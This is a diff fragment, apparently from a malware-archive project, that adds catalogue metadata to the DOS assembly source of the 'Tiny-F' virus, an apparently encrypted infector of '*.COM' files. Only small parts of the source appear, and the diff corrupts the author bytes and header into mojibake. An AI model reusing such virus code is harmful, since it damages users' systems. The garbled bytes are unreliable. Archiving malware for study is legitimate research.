@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      T
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 tinyv   SEGMENT BYTE PUBLIC 'code'
         ASSUME  CS:tinyv, DS:tinyv, SS:tinyv, ES:tinyv
 
@@ -163,7 +174,7 @@ exit:
 fspec   LABEL   WORD
         DB      '*.COM',0
 nondata DB      'Tiny-F version 1.1'    ; Program identification
-        DB      '˜€×@&î·³½ë'          ; author identification
+        DB      'ï¿½ï¿½ï¿½@&î·³ï¿½ï¿½'          ; author identification
         DB      'Released 10-19-91'     ; release date
 endenc  LABEL   BYTE                    ; end of encryption zone
 ;-----------------------------------------------------------------------------
